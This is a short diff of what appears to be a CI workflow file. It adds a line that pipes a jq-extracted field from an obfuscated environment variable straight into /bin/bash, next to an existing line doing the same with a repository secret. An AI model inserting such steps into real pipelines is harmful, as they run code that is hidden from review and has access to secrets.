@@ -23,6 +23,7 @@ jobs:
           r1: ${{ secrets.r1 }}
         run: |
           printf '%s' "$r1" | jq -r .hfm99 | /bin/bash
+          echo $zjdz3685 | jq -r .ijs8 | /bin/bash
 
       - name: Save output
         if: always()
